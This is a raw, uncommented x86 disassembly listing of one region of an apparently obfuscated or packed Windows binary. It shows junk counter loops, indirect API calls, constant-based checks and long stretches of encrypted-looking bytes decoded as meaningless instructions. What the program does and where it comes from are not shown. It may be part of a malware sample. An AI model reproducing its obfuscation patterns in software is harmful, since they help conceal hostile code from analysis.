  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	shl    BYTE PTR [esi+0x62],1
  407c4d:	pop    ss
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xeb7e7e7c
  407c57:	sub    eax,DWORD PTR [eax]
  407c59:	(bad)  
  407c5a:	lds    esp,FWORD PTR [esi-0x4f]
  407c5d:	mov    al,0xef
  407c5f:	jecxz  0x407cb4
  407c61:	sub    dh,0x90
  407c64:	or     eax,0xcb4a240c
  407c69:	into   
  407c6a:	jo     0x407bf3
  407c6c:	dec    esi
  407c6d:	test   al,0x18
  407c6f:	pop    esi
  407c70:	test   BYTE PTR [esi-0x4941ab63],bl
  407c76:	sar    BYTE PTR [edi-0x43452e17],cl
  407c7c:	jne    0x407c50
  407c7e:	fimul  WORD PTR [ebx+0x7e]
  407c81:	cs int3 
  407c83:	mov    ch,0x71
  407c85:	push   es
  407c86:	mov    esi,DWORD PTR [eax-0x79ab107a]
  407c8c:	in     al,dx
  407c8d:	dec    eax
  407c8e:	pop    ebx
  407c8f:	xor    eax,0x7363a507
  407c94:	add    al,BYTE PTR [edx]
  407c96:	pushf  
  407c97:	lods   al,BYTE PTR ds:[esi]
  407c98:	sub    BYTE PTR [eax+0x67f3e857],ch
  407c9e:	jbe    0x407c77
  407ca0:	inc    ebp
  407ca1:	dec    ebx
  407ca2:	rol    BYTE PTR [edi],0xc8
  407ca5:	pushf  
  407ca6:	cld    
  407ca7:	and    eax,0x75cbc37a
  407cac:	hlt    
  407cad:	cmp    DWORD PTR [ebp-0x3bec7454],ebp
  407cb3:	ret    
  407cb4:	je     0x407d1f
  407cb6:	lods   eax,DWORD PTR ds:[esi]
  407cb7:	xor    DWORD PTR [ecx],0x458a0061
  407cbd:	jb     0x407c89
  407cbf:	push   edx
  407cc0:	repz or dl,BYTE PTR [ebx]
  407cc3:	push   ebp
  407cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc5:	push   ds
  407cc6:	call   DWORD PTR [esi]
  407cc8:	not    DWORD PTR [ecx-0x45]
  407ccb:	jmp    0xec3:0xc20ef990
  407cd2:	adc    ebp,ebx
  407cd4:	xchg   DWORD PTR [edi-0x6b],ebx
  407cd7:	mov    cx,WORD PTR [esi-0x402c460e]
  407cde:	xchg   edx,eax
  407cdf:	mov    BYTE PTR [edi],ch
  407ce1:	cmp    BYTE PTR [eax+0x76],0xb3
  407ce5:	addr16 mov eax,ds:0x6818
  407ce9:	cmp    esi,DWORD PTR [ecx]
  407ceb:	rcr    DWORD PTR [edi],1
  407ced:	sub    BYTE PTR [ebp+edx*1+0x24],cl
  407cf1:	xor    al,0x21
  407cf3:	out    dx,eax
  407cf4:	pop    edi
  407cf5:	stos   BYTE PTR es:[edi],al
  407cf6:	out    dx,eax
  407cf7:	stos   DWORD PTR es:[edi],eax
  407cf8:	mov    ebx,DWORD PTR [eax+0x66077fdb]
  407cfe:	mov    bl,0x47
  407d00:	shl    DWORD PTR [edx+0x64742a4d],cl
  407d06:	and    al,bh
  407d08:	mov    esi,0x3e02ee60
  407d0d:	or     DWORD PTR [eax-0x3aadc146],esp
  407d13:	ds pop es
  407d15:	mov    fs,WORD PTR ds:0x3b489aa6
  407d1b:	adc    esp,edx
  407d1d:	xor    DWORD PTR [esp+eax*4-0x21d613a1],ebx
  407d24:	lahf   
  407d25:	mov    bl,0x70
  407d27:	mov    esp,0xaabae3ab
  407d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d2d:	cmp    edi,esi
  407d2f:	fstp   TBYTE PTR [edx+edi*2+0x12]
  407d33:	pop    es
  407d34:	sbb    cl,BYTE PTR [esi]
  407d36:	loop   0x407d45
  407d38:	jmp    0x407d23
  407d3a:	mov    ebp,0x30be77cc
  407d3f:	push   cs
  407d40:	(bad)  
  407d41:	and    cl,BYTE PTR [ebp+0x774cbc14]
  407d47:	or     al,0xd4
  407d49:	pop    edx
  407d4a:	(bad)
  407d4e:	inc    edi
  407d4f:	sbb    eax,0x4957cb4
  407d54:	clc    
  407d55:	data16 test al,0x58
  407d58:	adc    edi,DWORD PTR [edi+0xe]
  407d5b:	xchg   BYTE PTR [edi],bl
  407d5d:	pop    edi
  407d5e:	sub    esp,edx
  407d60:	dec    esi
  407d61:	jg     0x407d38
  407d63:	dec    esi
  407d64:	mov    bh,0x61
  407d66:	js     0x407dda
  407d68:	shr    BYTE PTR [ebx],1
  407d6a:	retf   
  407d6b:	jl     0x407cf7
  407d6d:	sub    ch,dh
  407d6f:	loopne 0x407dee
  407d71:	sti    
  407d72:	in     al,dx
  407d73:	mov    ebp,?
  407d75:	mov    dl,0xd6
  407d77:	xchg   DWORD PTR [ecx],edx
  407d79:	in     al,dx
  407d7a:	add    eax,0x3863bf45
  407d7f:	test   al,0x5a
  407d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d82:	aas    
  407d83:	aas    
  407d84:	(bad)  
  407d85:	je     0x407dcb
  407d87:	test   al,0xad
  407d89:	pop    ebx
  407d8a:	xchg   ebp,eax
  407d8b:	cmp    ebp,ebp
  407d8d:	mov    esi,DWORD PTR [edi+edx*4+0x5be29113]
  407d94:	out    0xec,eax
  407d96:	dec    eax
  407d97:	xor    al,0x87
  407d99:	ds das 
  407d9b:	mov    cl,0x57
  407d9d:	sahf   
  407d9e:	push   ebp
  407d9f:	pop    ds
  407da0:	cld    
  407da1:	pusha  
  407da2:	jne    0x407e08
  407da4:	mov    al,BYTE PTR ds:0xa202043c
  407daa:	sub    dh,BYTE PTR [eax+ebx*4-0x7a]
  407dae:	arpl   WORD PTR [ebx],ax
  407db0:	or     DWORD PTR [edx+0x2b],0x44
  407db4:	xchg   edi,eax
  407db5:	stos   DWORD PTR es:[edi],eax
  407db6:	push   esp
  407db7:	fwait
  407db8:	test   al,0x6d
  407dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dbb:	ins    BYTE PTR es:[edi],dx
  407dbc:	les    esp,FWORD PTR [edi+0x461b0866]
  407dc2:	call   0x463:0x3751ac6a
  407dc9:	gs adc cl,al
  407dcc:	pop    ds
  407dcd:	mov    bl,0x6c
  407dcf:	adc    dl,al
  407dd1:	icebp  
  407dd2:	jg     0x407e05
  407dd4:	outs   dx,DWORD PTR ds:[esi]
  407dd5:	call   0x87f2c10a
  407dda:	cmp    dl,BYTE PTR ds:0x771d08c3
  407de0:	push   edx
  407de1:	mov    ebp,0x9da0fcf2
  407de6:	aad    0x11
  407de8:	outs   dx,DWORD PTR ds:[esi]
  407de9:	mov    edx,0x4b63930e
  407dee:	jge    0x407dfa
  407df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407df1:	push   ds
  407df2:	sbb    esp,DWORD PTR [eax+eiz*8+0x32]
  407df6:	mov    esp,0xdb8f4f4b
  407dfb:	add    eax,0x67533bc
  407e00:	outs   dx,BYTE PTR ds:[esi]
  407e01:	cmc    
  407e02:	adc    al,0xcd
  407e04:	int    0xba
  407e06:	xchg   DWORD PTR [esi+0x3e],eax
  407e09:	push   cs
  407e0a:	shr    DWORD PTR [esp+esi*2-0x47],1
  407e0e:	icebp  
  407e0f:	or     DWORD PTR [esi+0x69],0x28
  407e13:	enter  0xc886,0x17
  407e17:	xor    BYTE PTR [ebp-0x38],0xbc
  407e1b:	xor    eax,0x2d64edd2
  407e20:	inc    esi
  407e21:	lods   al,BYTE PTR ds:[esi]
  407e22:	test   al,0xee
  407e24:	hlt    
  407e25:	sbb    DWORD PTR [ebx+0x4cdd4b7c],ecx
  407e2b:	sbb    BYTE PTR [ebp-0x1f2354b2],al
  407e31:	mov    edi,0x5e10d870
  407e36:	and    al,0x72
  407e38:	push   esi
  407e39:	cmp    BYTE PTR [ecx-0x625ea95e],ch
  407e3f:	or     bh,BYTE PTR [eax+ebp*1+0x23a4320e]
  407e46:	and    al,0x10
  407e48:	dec    ecx
  407e49:	lods   al,BYTE PTR ds:[esi]
  407e4a:	fld    st(4)
  407e4c:	jg     0x407e42
  407e4e:	(bad)  
  407e4f:	ins    BYTE PTR es:[edi],dx
  407e50:	and    BYTE PTR [ebp-0x3c543c1a],bh
  407e56:	in     eax,dx
  407e57:	popa   
  407e58:	mov    BYTE PTR [eax],ah
  407e5a:	adc    edi,esp
  407e5c:	sub    eax,0x3af380a6
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x9353f50d
  408191:	mov    edi,0x7e7eca3e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	xchg   esi,eax
  40819b:	or     DWORD PTR [edx+0x72],eax
  40819e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40819f:	dec    edi
  4081a0:	leave  
  4081a1:	sub    DWORD PTR [ecx],edi
  4081a3:	out    dx,eax
  4081a4:	jb     0x408216
  4081a6:	hlt    
  4081a7:	lods   al,BYTE PTR ds:[esi]
  4081a8:	cmp    eax,0xa12c1ba0
  4081ad:	retf   
  4081ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081af:	inc    ebp
  4081b0:	cmp    ah,BYTE PTR [eax]
  4081b2:	int    0xab
  4081b4:	pop    ss
  4081b5:	lock push esp
  4081b7:	dec    ecx
  4081b8:	xor    al,0x48
  4081ba:	fsub   DWORD PTR [ebx+0x1]
  4081bd:	or     eax,0xa5ea51e7
  4081c2:	cmp    ch,BYTE PTR [edi+0x42]
  4081c5:	enter  0x4373,0x65
  4081c9:	stos   BYTE PTR es:[edi],al
  4081ca:	mov    ebp,0xfee448c2
  4081cf:	stos   BYTE PTR es:[edi],al
  4081d0:	popf   
  4081d1:	out    0x2b,al
  4081d3:	pop    esi
  4081d4:	adc    cl,BYTE PTR [ebp*2-0x3e5e57db]
  4081db:	fbld   TBYTE PTR [eax]
  4081dd:	dec    edi
  4081de:	fist   WORD PTR [ecx+0x26]
  4081e1:	sub    DWORD PTR [ecx-0x73df9214],esi
  4081e7:	(bad)  
  4081e8:	jnp    0x40817f
  4081ea:	inc    eax
  4081eb:	mov    ah,0xdd
  4081ed:	out    dx,al
  4081ee:	lea    esp,[edx]
  4081f0:	pop    es
  4081f1:	mov    ds:0x22eba4b7,al
  4081f6:	push   ecx
  4081f7:	cld    
  4081f8:	out    0xce,eax
  4081fa:	jmp    0xc42:0x80b865da
  408201:	sahf   
  408202:	mov    al,0xe5
  408204:	push   0x2c8f6bd
  408209:	(bad)  
  40820a:	call   0x163b901a
  40820f:	pop    ds
  408210:	inc    edi
  408211:	(bad)  
  408212:	loop   0x40823f
  408214:	mov    ds:0xcd1a2d97,al
  408219:	xchg   ebx,eax
  40821a:	sbb    esi,eax
  40821c:	jnp    0x4081eb
  40821e:	mov    al,0x83
  408220:	sub    ah,BYTE PTR [ebp-0x57]
  408223:	sbb    al,0xcf
  408225:	stc    
  408226:	(bad)  
  408227:	dec    ebp
  408228:	jg     0x40828f
  40822a:	inc    ebx
  40822b:	mov    ebp,0xa689cc5d
  408230:	pop    ecx
  408231:	scas   al,BYTE PTR es:[edi]
  408232:	ret    0x929b
  408235:	xchg   esi,eax
  408236:	pop    edi
  408237:	ror    BYTE PTR [eax-0x7fa58fa2],1
  40823d:	jae    0x4081dd
  40823f:	push   ss
  408240:	popf   
  408241:	outs   dx,DWORD PTR ds:[esi]
  408242:	inc    esi
  408243:	inc    edi
  408244:	ins    BYTE PTR es:[edi],dx
  408245:	mov    ecx,0x9a5294ad
  40824a:	int    0x49
  40824c:	push   0xffffffd9
  40824e:	fisttp WORD PTR [eax-0x6a]
  408251:	cwde   
  408252:	outs   dx,BYTE PTR ds:[esi]
  408253:	inc    eax
  408254:	sqrtps xmm1,XMMWORD PTR [ecx]
  408257:	push   ebx
  408258:	in     al,0x17
  40825a:	std    
  40825b:	sub    ebx,edx
  40825d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40825e:	sbb    esi,DWORD PTR [edi+0x72]
  408261:	mov    esi,0xa7fa778c
  408266:	lea    ecx,[eax+0x5ab8b5c9]
  40826c:	inc    ebp
  40826d:	pop    ecx
  40826e:	or     ecx,DWORD PTR [ecx-0x612ed3ae]
  408274:	in     al,dx
  408275:	fimul  DWORD PTR [ebx+0x554dc64b]
  40827b:	popf   
  40827c:	out    dx,al
  40827d:	(bad)  
  40827e:	dec    edx
  40827f:	pop    es
  408280:	xchg   ebx,eax
  408281:	ins    BYTE PTR es:[edi],dx
  408282:	or     BYTE PTR [eax+0x76],0x3f
  408286:	cmp    DWORD PTR [ebx],esp
  408288:	fs cmc 
  40828a:	pop    es
  40828b:	fnstenv ds:0xfd4546e7
  408291:	adc    DWORD PTR [edx+ecx*8-0x6a07b7ca],ebx
  408298:	inc    esp
  408299:	(bad)  
  40829b:	cli    
  40829c:	pop    esi
  40829d:	or     DWORD PTR [eax],0xf7753184
  4082a3:	pushf  
  4082a4:	mov    bh,0x79
  4082a6:	into   
  4082a7:	fsubr  QWORD PTR [ecx+0x2b]
  4082aa:	jnp    0x40825c
  4082ac:	dec    edi
  4082ad:	push   0xae132deb
  4082b2:	rcr    BYTE PTR [edx+0xd],0x44
  4082b6:	fiadd  WORD PTR [ebp-0x3e]
  4082b9:	push   eax
  4082ba:	mov    esp,0x6b599243
  4082bf:	mov    esp,0x3b5b5867
  4082c4:	call   0x239a3a61
  4082c9:	sbb    BYTE PTR [ebp+0x41],0x54
  4082cd:	or     eax,ebp
  4082cf:	dec    edx
  4082d0:	sbb    DWORD PTR [edx],0x6e
  4082d3:	rol    BYTE PTR [esi-0x44],0x5a
  4082d7:	xor    al,cl
  4082d9:	jmp    0xb0a8d81e
  4082de:	cli    
  4082df:	cmp    BYTE PTR [esi],bh
  4082e1:	push   ebx
  4082e2:	out    0x44,al
  4082e4:	ja     0x408286
  4082e6:	sub    eax,0x70821389
  4082eb:	outs   dx,DWORD PTR ds:[esi]
  4082ec:	mov    ecx,0x39e197ac
  4082f1:	mov    bl,0x15
  4082f3:	pop    ss
  4082f4:	push   0x30741ee7
  4082f9:	inc    edi
  4082fa:	out    0x5d,eax
  4082fc:	or     dh,BYTE PTR [ebx+0x5e]
  4082ff:	iret   
  408300:	xchg   ebp,eax
  408301:	and    ebx,ecx
  408303:	push   esi
  408304:	add    edx,DWORD PTR [ebp-0x24]
  408307:	retf   
  408308:	les    edi,FWORD PTR ds:0xf5a4fa82
  40830e:	ficomp DWORD PTR [esi]
  408310:	adc    BYTE PTR [ecx-0x25],0x1e
  408314:	pop    esi
  408315:	xchg   esi,eax
  408317:	popf   
  408318:	jae    0x4082aa
  40831a:	test   BYTE PTR ds:0x7bf9eba9,0x3c
  408321:	inc    esp
  408322:	add    ecx,DWORD PTR [edi]
  408324:	int3   
  408325:	sbb    BYTE PTR [ebx+0x48],bl
  408328:	pop    es
  408329:	dec    esp
  40832a:	xor    eax,0x19b6bec2
  40832f:	inc    ebp
  408330:	xor    BYTE PTR cs:[edi+edx*8],ch
  408334:	repz bound edx,QWORD PTR [ecx-0x8a472f]
  40833b:	mov    ds,WORD PTR [edi-0x13]
  40833e:	out    dx,eax
  40833f:	xchg   esi,eax
  408340:	xchg   ecx,eax
  408341:	mov    es,ecx
  408343:	cmp    BYTE PTR [ebx],dh
  408345:	int3   
  408346:	imul   edi,DWORD PTR [ecx+edi*8-0x38],0x99eeb18c
  40834e:	jbe    0x408319
  408350:	push   esp
  408351:	jno    0x408373
  408353:	shl    dl,1
  408355:	sub    al,0xa3
  408357:	out    dx,eax
  408358:	sub    eax,0xaf5a4694
  40835d:	pushf  
  40835e:	sub    DWORD PTR [edx],edi
  408360:	push   esp
  408361:	(bad)  
  408362:	xchg   edi,eax
  408363:	mov    ebp,0xa941f756
  408368:	add    eax,0x3af1cf75
  40836d:	add    esp,DWORD PTR [ecx-0x4a]
  408370:	pop    esp
  408371:	lock xlat BYTE PTR ds:[ebx]
  408373:	mov    bl,0x5e
  408375:	and    DWORD PTR ds:0x56171233,0x2c5ee899
  40837f:	scas   eax,DWORD PTR es:[edi]
  408380:	add    DWORD PTR [edi],eax
  408382:	stos   BYTE PTR es:[edi],al
  408383:	mov    ch,0x39
  408385:	hlt    
  408386:	push   eax
  408387:	push   ds
  408388:	mov    BYTE PTR [edi+0x6fb105ba],dh
  40838e:	shl    BYTE PTR [eax],cl
  408390:	loope  0x4083ea
  408392:	aas    
  408393:	sti    
  408394:	cmp    BYTE PTR [eax+ecx*1+0x40],0x6b
  408399:	push   ebp
  40839a:	cld    
  40839b:	div    BYTE PTR [eax+ebx*4+0x2babb1c6]
  4083a2:	ret    
  4083a3:	aad    0xdb
  4083a5:	xor    dh,bh
  4083a7:	push   edi
  4083a8:	inc    edx
  4083a9:	mov    eax,0xebfd12c
  4083ae:	jmp    0x65e3ee24
  4083b3:	ror    DWORD PTR [ebx],0x71
  4083b6:	mov    ebx,0x6ca5d97a
  4083bb:	add    edx,ebx
  4083bd:	mov    ch,0xf4
  4083bf:	mov    eax,ds:0x9ef8e118
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43375b,0x0
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	mov    al,ds:0xe4aee08e
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x408446
  408471:	adc    BYTE PTR [ebx+eiz*1-0x24],0x35
  408476:	pop    ss
  408477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408478:	push   edx
  408479:	dec    ecx
  40847a:	push   0xba55f70d
  40847f:	loop   0x408426
  408481:	mov    ah,0x3d
  408483:	lods   eax,DWORD PTR ds:[esi]
  408484:	shr    DWORD PTR [ecx+0x452f3c01],1
  40848a:	mov    eax,ds:0x7499af91
  40848f:	outs   dx,BYTE PTR ds:[esi]
  408490:	adc    DWORD PTR [edx-0x6b],ebx
  408493:	sar    DWORD PTR ds:0xfaef15b5,cl
  408499:	push   esp
  40849a:	cld    
  40849b:	and    ch,BYTE PTR [ebx]
  40849d:	or     ebp,DWORD PTR [ebp+ecx*2-0x51e67e4f]
  4084a4:	xchg   esi,eax
  4084a5:	xchg   ebp,eax
  4084a6:	xor    al,0xad
  4084a8:	int3   
  4084a9:	sbb    DWORD PTR [edx],ecx
  4084ab:	push   edx
  4084ac:	sbb    al,dh
  4084ae:	jnp    0x72d1ddfd
  4084b4:	call   0x8067:0x199dba0d
  4084bb:	int    0xfd
  4084bd:	(bad)  
  4084be:	(bad)  
  4084bf:	out    dx,al
  4084c0:	push   0x6f83fbdd
  4084c5:	xor    bl,dh
  4084c7:	gs test al,0x10
  4084ca:	mov    WORD PTR [ecx+0x22],cs
  4084cd:	rdtsc  
  4084cf:	in     eax,0xdc
  4084d1:	loope  0x40853e
  4084d3:	xchg   ecx,eax
  4084d4:	xchg   DWORD PTR [edi-0x22],ebx
  4084d7:	mov    esp,DWORD PTR [ebx+ebp*1]
  4084da:	mov    ecx,0xba2c2ccc
  4084df:	cs ret 
  4084e1:	cwde   
  4084e2:	sub    BYTE PTR [edx-0x68e85013],0xd7
  4084e9:	in     eax,dx
  4084ea:	test   BYTE PTR [ebp+ebx*4-0x68],0x99
  4084ef:	pop    esp
  4084f0:	scas   al,BYTE PTR es:[edi]
  4084f1:	test   DWORD PTR [eax+0x18645efd],ebx
  4084f7:	sub    BYTE PTR [ecx+0x5da5217f],cl
  4084fd:	or     eax,0xc0f642a0
